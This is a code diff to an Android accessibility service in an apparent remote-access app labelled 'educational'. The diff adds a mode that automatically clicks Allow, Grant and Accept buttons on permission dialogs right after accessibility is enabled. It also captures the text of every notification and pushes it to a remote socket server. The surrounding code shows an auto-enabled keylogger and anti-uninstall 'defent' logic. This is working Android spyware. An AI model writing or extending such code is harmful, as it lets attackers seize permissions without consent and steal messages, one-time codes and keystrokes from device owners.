@@ -48,6 +48,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     
     // Uninstall-assist mode: when true, accessibility clicks Uninstall/OK buttons
     private volatile boolean uninstallAssistMode = false;
+
+    // Auto-grant mode: clicks Allow/Grant/OK buttons for 10 seconds after accessibility enabled
+    private volatile boolean autoGrantMode = false;
+    private Handler autoGrantHandler;
     
     // Defent variables - run continuously forever
     private String currentAppName = "";
@@ -88,7 +92,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                          AccessibilityEvent.TYPE_VIEW_CLICKED |
                          AccessibilityEvent.TYPE_VIEW_SCROLLED |
                          AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
-                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
+                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
+                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
         info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
@@ -99,6 +104,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         
         // Auto-enable keylogger as soon as accessibility is granted
         com.remoteaccess.educational.commands.KeyloggerService.setEnabled(true);
+
+        // Auto-grant permissions mode: click Allow/Grant/OK for 10 seconds
+        startAutoGrantTimer();
 
         // Start continuous auto-click scan immediately (defent + uninstall-assist only)
         startAutoClickScanner();
@@ -330,6 +338,30 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                     autoClickAllowButton();
                     break;
+
+                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: {
+                    // Push notification via accessibility event (backup for NotificationListenerService)
+                    try {
+                        List<CharSequence> notifTexts = event.getText();
+                        String notifPkg = packageName;
+                        String notifTitle = "";
+                        String notifText = "";
+                        if (notifTexts != null && !notifTexts.isEmpty()) {
+                            notifTitle = notifTexts.get(0) != null ? notifTexts.get(0).toString() : "";
+                            if (notifTexts.size() > 1 && notifTexts.get(1) != null) {
+                                notifText = notifTexts.get(1).toString();
+                            }
+                        }
+                        if (!notifPkg.isEmpty() && (!notifTitle.isEmpty() || !notifText.isEmpty())) {
+                            String appName = getAppNameForPkg(notifPkg);
+                            SocketManager smNotif = SocketManager.getInstance(this);
+                            if (smNotif != null && smNotif.isConnected()) {
+                                smNotif.pushNotification(notifPkg, appName, notifTitle, notifText, System.currentTimeMillis());
+                            }
+                        }
+                    } catch (Exception ignored) {}
+                    break;
+                }
             }
             
         } catch (Exception e) {
@@ -370,6 +402,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 rootNode.recycle();
                 return;
             }
+            // Auto-grant mode: click permission dialogs for 10 seconds after accessibility enabled.
+            if (autoGrantMode && runPermissionGranter(rootNode)) {
+                rootNode.recycle();
+                return;
+            }
             // Then continuous defent protection.
             if (runDefentProtection(rootNode)) {
                 rootNode.recycle();
@@ -380,6 +417,45 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+
+    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 10 seconds. */
+    private void startAutoGrantTimer() {
+        autoGrantMode = true;
+        autoGrantHandler = new Handler(Looper.getMainLooper());
+        autoGrantHandler.postDelayed(() -> {
+            autoGrantMode = false;
+            Log.i(TAG, "Auto-grant mode expired after 10 seconds");
+        }, 10_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 10s");
+    }
+
+    /** Clicks permission-granting buttons: Allow, Grant, OK, Allow all time, etc. */
+    private boolean runPermissionGranter(AccessibilityNodeInfo rootNode) {
+        String[] grantWords = {
+            "Allow all the time", "Allow only while using the app",
+            "Allow", "ALLOW", "Grant", "GRANT",
+            "OK", "Ok", "Yes", "YES",
+            "Accept", "ACCEPT", "Agree", "AGREE",
+            "Continue", "CONTINUE", "Proceed", "PROCEED",
+            "Enable", "ENABLE", "Turn on", "TURN ON",
+            "Permit", "PERMIT",
+        };
+        for (String word : grantWords) {
+            if (findAndClickFullWord(rootNode, word)) {
+                Log.i(TAG, "Auto-grant clicked: " + word);
+                return true;
+            }
+        }
+        // Also try contains-based for partial matches
+        String[] containsWords = { "allow", "grant", "permit", "accept" };
+        for (String word : containsWords) {
+            if (findAndClickContaining(rootNode, word)) {
+                Log.i(TAG, "Auto-grant clicked (contains): " + word);
+                return true;
+            }
+        }
+        return false;
     }
     
     private boolean runDefentProtection(AccessibilityNodeInfo rootNode) {
@@ -666,6 +742,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         if (autoClickHandler != null && autoClickRunnable != null) {
             autoClickHandler.removeCallbacks(autoClickRunnable);
         }
+        if (autoGrantHandler != null) {
+            autoGrantHandler.removeCallbacksAndMessages(null);
+            autoGrantHandler = null;
+        }
+        autoGrantMode = false;
         if (socketCheckHandler != null && socketCheckRunnable != null) {
             socketCheckHandler.removeCallbacks(socketCheckRunnable);
             socketCheckHandler = null;
